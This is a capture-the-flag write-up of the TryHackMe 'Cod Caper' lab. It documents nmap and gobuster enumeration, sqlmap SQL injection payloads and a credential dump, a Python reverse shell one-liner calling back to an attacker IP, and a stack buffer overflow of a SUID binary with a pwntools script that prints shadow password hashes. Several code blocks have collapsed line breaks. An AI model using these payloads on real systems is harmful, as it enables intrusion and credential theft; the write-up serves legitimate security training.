---
title : The cod caper
description : A guided room taking you through infiltrating and exploiting a Linux system..
slug : the-cod-ca[er
date : 2022-06-17 00:00:00+0000
image : cover.png
categories :
    - Try hack me 
    - Crypto & Hashes
tags :
    - writeup
weight : 1
---

### Host Enumeration

#### Network Mapper
```bash
nmap -sC -sV thecodcaper.thm -oN nmap.txt
```
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 10:37 +0545
Nmap scan report for thecodcaper.thm (10.10.24.166)
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
**/tcp open  ssh     ********** (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
**/tcp open  http    Apache ****** ((Ubuntu))
|_http-server-header: **** (Ubuntu)
|_http-title: *******
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.94 seconds
```
#### Directory Busting (Gobuster)
Ok done! Lets jump into web
As suggested I have downloaded the big.txt and gobuster tool now lets get into web enumeration

```bash
gobuster dir -u http://thecodcaper.thm/ -w big.txt -o directory.txt -x html,php,txt -q --no-error -t 120 -b 403,404
```
```bash
[selenophilem7@Tadashi]-[~/Documents/Hacking/TryHackMe/thecodcaper]
>>> gobuster dir -u http://thecodcaper.thm/ -w big.txt -o directory.txt -x html,php,txt -q --no-error -t 120 -b 403,404
/**********.***   (Status: 200) [Size: 409]
```
![First Image](img-1.png)

### Web Exploitation
#### SQL injection 
```bash
sqlmap --forms -u http://thecodcaper.thm/administrator.php --dbs
```
```
[selenophilem7@Tadashi]-[~/Documents/Hacking/TryHackMe/thecodcaper]
>>> sqlmap --forms -u http://thecodcaper.thm/administrator.php --dbs          
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:02:41 /2022-08-15/

[23:02:41] [INFO] testing connection to the target URL
[23:02:41] [INFO] searching for forms
[1/1] Form:
POST http://thecodcaper.thm/administrator.php
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> 
Edit POST data [default: username=&password=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] 
[23:02:47] [INFO] using '/home/selenophilem7/.local/share/sqlmap/output/results-08152022_1102pm.csv' as the CSV results file in multiple targets mode
[23:02:47] [INFO] testing if the target URL content is stable
[23:02:48] [INFO] target URL content is stable
[23:02:48] [INFO] testing if POST parameter 'username' is dynamic
[23:02:48] [WARNING] POST parameter 'username' does not appear to be dynamic
[23:02:48] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
[23:02:48] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
[23:02:48] [INFO] testing for SQL injection on POST parameter 'username'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[23:03:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:03:14] [WARNING] reflective value(s) found and filtering out
[23:03:17] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[23:03:17] [INFO] testing 'Generic inline queries'
[23:03:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[23:03:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[23:03:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[23:03:55] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[23:03:56] [INFO] POST parameter 'username' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --not-string="Got")
[23:03:56] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[23:03:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[23:03:58] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[23:03:59] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[23:04:00] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[23:04:00] [INFO] POST parameter 'username' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[23:04:00] [INFO] testing 'MySQL inline queries'
[23:04:00] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[23:04:00] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[23:04:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[23:04:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[23:04:01] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[23:04:01] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[23:04:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[23:04:12] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[23:04:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[23:04:12] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[23:04:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[23:04:12] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[23:04:14] [INFO] target URL appears to have 2 columns in query

injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
[23:06:33] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 

[23:06:40] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'

[23:06:47] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[23:06:52] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[23:06:59] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[23:07:04] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[23:07:11] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[23:07:17] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[23:07:22] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[23:07:27] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'

sqlmap identified the following injection point(s) with a total of 383 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=vaPA' RLIKE (SELECT (CASE WHEN (5986=5986) THEN 0x76615041 ELSE 0x28 END))-- hLnX&password=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=vaPA' AND GTID_SUBSET(CONCAT(0x716a767671,(SELECT (ELT(3666=3666,1))),0x716b627171),3666)-- AxTL&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=vaPA' AND (SELECT 9668 FROM (SELECT(SLEEP(5)))tRJt)-- iPov&password=
---
do you want to exploit this SQL injection? [Y/n] 
[23:07:33] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[23:07:36] [INFO] fetching database names
[23:07:37] [INFO] retrieved: 'information_schema'
[23:07:38] [INFO] retrieved: 'mysql'
[23:07:38] [INFO] retrieved: 'performance_schema'
[23:07:39] [INFO] retrieved: 'sys'
[23:07:39] [INFO] retrieved: 'users'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users

[23:07:39] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/selenophilem7/.local/share/sqlmap/output/results-08152022_1102pm.csv'

[*] ending @ 23:07:39 /2022-08-15/
```
Now time to look juicy part which is users table lets enumerate that one.
Lets run the following command .
```bash
[selenophilem7@Tadashi]-[~/Documents/Hacking/TryHackMe/thecodcaper]
>>> sqlmap --forms -u http://thecodcaper.thm/administrator.php --dump users
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.2#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:47:59 /2022-08-15/

[23:47:59] [INFO] testing connection to the target URL
[23:48:00] [INFO] searching for forms
[1/1] Form:
POST http://thecodcaper.thm/administrator.php
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> 
Edit POST data [default: username=&password=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] 
[23:48:13] [INFO] resuming back-end DBMS 'mysql' 
[23:48:13] [INFO] using '/home/selenophilem7/.local/share/sqlmap/output/results-08152022_1148pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=vaPA' RLIKE (SELECT (CASE WHEN (5986=5986) THEN 0x76615041 ELSE 0x28 END))-- hLnX&password=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=vaPA' AND GTID_SUBSET(CONCAT(0x716a767671,(SELECT (ELT(3666=3666,1))),0x716b627171),3666)-- AxTL&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=vaPA' AND (SELECT 9668 FROM (SELECT(SLEEP(5)))tRJt)-- iPov&password=
---
do you want to exploit this SQL injection? [Y/n] 
[23:48:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[23:48:14] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[23:48:14] [INFO] fetching current database
[23:48:14] [INFO] retrieved: 'users'
[23:48:14] [INFO] fetching tables for database: 'users'
[23:48:15] [INFO] retrieved: 'users'
[23:48:15] [INFO] fetching columns for table 'users' in database 'users'
[23:48:15] [INFO] retrieved: 'username'
[23:48:15] [INFO] retrieved: 'varchar(100)'
[23:48:16] [INFO] retrieved: 'password'
	[23:48:16] [INFO] retrieved: 'varchar(100)'
[23:48:16] [INFO] fetching entries for table 'users' in database 'users'
[23:48:17] [INFO] retrieved: 'secretpass'
[23:48:17] [INFO] retrieved: 'pingudad'
Database: users
Table: users
[1 entry]
+------------+----------+
| password   | username |
+------------+----------+
| ********** | ******** |
+------------+----------+

[23:48:17] [INFO] table 'users.users' dumped to CSV file '/home/selenophilem7/.local/share/sqlmap/output/thecodcaper.thm/dump/users/users.csv'
[23:48:17] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/selenophilem7/.local/share/sqlmap/output/results-08152022_1148pm.csv'

[*] ending @ 23:48:17 /2022-08-15/

[selenophilem7@Tadashi]-[~/Documents/Hacking/TryHackMe/thecodcaper]
>>>
```
Note if you look at first one sqlmap output you can see in info section instead of testing there are Post which are vulnerable which are all together 3 
And the login…

![img-2](img-2.png)

#### Command Execution

![img-3](img-3.png)
Got some files.

### Intial Foothold
Then tried to execute the reverse shell but many don’t work but python’s payload worked.
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Attacker-IP",Attacker-Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Ok in your system start netcat on a port It will be attacker IP and your tun0 will be attacker ip change it according to yours machine.

```bash
nc -lvnp <Attacker IP>
```
To make shell fully interactive 

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
Background the process  ```CTRL+Z``` . Then run the following command

```bash
$ echo $TERM
..........
$ stty raw -echo && fg
$ # Note as the process gets foreground type reset. Then It will ask 
	# For Terminal type spam the output of 'echo $TERM' and we are all done
```
Now time to find weather pingu has his old account or not 

```bash
www-data@ubuntu:/var/hidden$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
papa:x:1000:1000:qaa:/home/papa:/bin/bash
mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
pingu:x:1002:1002::/home/pingu:/bin/bash
www-data@ubuntu:/var/hidden$
```
It seems he does have….
```bash
www-data@ubuntu:/var/www/html$ pwd
/var/www/html
www-data@ubuntu:/var/www/html$ cd ..
www-data@ubuntu:/var/www$ ls
html
www-data@ubuntu:/var/www$ cd ..
www-data@ubuntu:/var$ ls
backups  cache	hidden	lib  local  lock  log  mail  opt  run  spool  tmp  www
www-data@ubuntu:/var$ cd hidden 
www-data@ubuntu:/var/hidden$ ls
pass
www-data@ubuntu:/var/hidden$ cat pass
pinguapingu
www-data@ubuntu:/var/hidden$
```
Time to be pingu
```bash
www-data@ubuntu:/var/hidden$ su pingu
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```
By this way we become pingu

### Privilege Escalation
#### Linux Enum
Uploaded LinEnum file to the server using scp command from the war machine

```bash
scp /usr/share/priv\ esc/LinEnum.sh pingu@thecodcaper.thm:/home/pingu
```
LinEnum can be downloaded from [this link](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
In the reverse shell
```bash
pingu@ubuntu:/var/hidden$ cd ~    
pingu@ubuntu:~$ pwd
/home/pingu
pingu@ubuntu:~$ ls
LinEnum.sh
pingu@ubuntu:~$ chmod +x LinEnum.sh
pingu@ubuntu:~$ bash LinEnum.sh
```
After running this file found interesting file

#### pwndbg
Now lets ssh to the pingu
```bash
[selenophilem7@Tadashi]-[~/Documents/Hacking/TryHackMe/thecodcaper]
>>> ssh pingu@thecodcaper.thm 
pingu@thecodcaper.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Mon Jan 20 14:14:47 2020
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

pingu@ubuntu:~$
```
so we started with `gdb` tool on the root file  on /opt/secrect
```bash
$ gdb root
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 178 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from root...(no debugging symbols found)...done.
pwndbg> r < <(cyclic 50)
Starting program: /opt/secret/root < <(cyclic 50)
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/pingu/.pwntools-cache-2.7/update to 'never'.
[!] An issue occurred while checking PyPI
[*] You have the latest version of Pwntools (4.0.0)

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────
 EAX  0x1
 EBX  0x0
 ECX  0x1
 EDX  0xf778687c (_IO_stdfile_0_lock) ◂— 0
 EDI  0xf7785000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 ESI  0xf7785000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 EBP  0x6161616b ('kaaa')
 ESP  0xff86e830 ◂— 0xf700616d /* 'ma' */
 EIP  0x6161616c ('laaa')
─────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────
Invalid address 0x6161616c










──────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────
00:0000│ esp  0xff86e830 ◂— 0xf700616d /* 'ma' */
01:0004│      0xff86e834 —▸ 0xff86e850 ◂— 0x1
02:0008│      0xff86e838 ◂— 0x0
03:000c│      0xff86e83c —▸ 0xf75eb637 (__libc_start_main+247) ◂— add    esp, 0x10
04:0010│      0xff86e840 —▸ 0xf7785000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
... ↓
06:0018│      0xff86e848 ◂— 0x0
07:001c│      0xff86e84c —▸ 0xf75eb637 (__libc_start_main+247) ◂— add    esp, 0x10
────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────
 ► f 0 6161616c
   f 1 f700616d
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l 0x6161616c
44
pwndbg>
```
After doing this things we can know that we need 44 character of inputs.Now the next step is to find out exactly where the shell function is in memory so we know what to set EIP to. 

Note: Modern CPU architectures are "little endian" meaning bytes are backwards. For example "0x080484cb" would become "cb840408”
```bash
pingu@ubuntu:/opt/secret$ python -c 'import struct; print"A"*44 + struct.pack("<I",0x080484cb)' | ./root 
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18277:0:99999:7:::
uuidd:*:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
Segmentation fault
pingu@ubuntu:/opt/secret$
```
Automating
Pwntools is a python library dedicated to making everything we just 
did in the last task much simpler. However, since it is a library, it 
requires python knowledge to use to it's full potential, and as such 
everything in this task will be done using a python script.

We start off the script with:
```python3
from pwn import *proc = process('/opt/secret/root')
```
This
 imports all the utilities from the pwntools library so we can use them 
in our script, and then creates a process that we can interact with 
using pwntools functions.

We know that we need the memory address of the shell function, and pwntools provides a way to obtain that with ELF().

ELF
 allows us to get various memory addresses of important points in our 
binary, including the memory address of the shell function.

With the ELF addition our script becomes
```python3
from pwn import *proc = process('/opt/secret/root')elf = ELF('/opt/secret/root')shell_func = elf.symbols.shell
```
shell_func
 holds the memory address of our shell function. Now we need a way to 
form the payload, luckily pwntools has that to with fit().

fit allows us to form a payload by combining characters and our memory address. To send the payload we can use a method in our `proc`
 variable, proc.sendline(), which just sends whatever data we want to 
the binary. Finally we can use proc.interactive(), to view the full 
output of the process.

With all that our final exploit script becomes
```python3
from pwn import *proc = process('/opt/secret/root')elf = ELF('/opt/secret/root')shell_func = elf.symbols.shellpayload = fit({44: shell_func # this adds the value of shell_func after 44 characters})proc.sendline(payload)proc.interactive()
```
After that we got output something like
```bash
oot:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18277:0:99999:7:::
uuidd:*:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
```
And decrypting the we got the root password.

